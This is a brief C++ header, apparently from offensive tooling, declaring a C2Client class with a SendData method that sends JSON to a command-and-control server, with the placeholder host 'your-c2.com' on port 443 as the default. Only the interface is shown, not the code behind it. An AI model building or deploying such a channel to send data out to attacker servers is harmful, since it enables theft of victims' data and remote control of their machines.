#pragma once
#include <windows.h>
#include <string>

class C2Client
{
public:
    static bool SendData(const std::string& jsonData, const wchar_t* server = L"your-c2.com", int port = 443);
};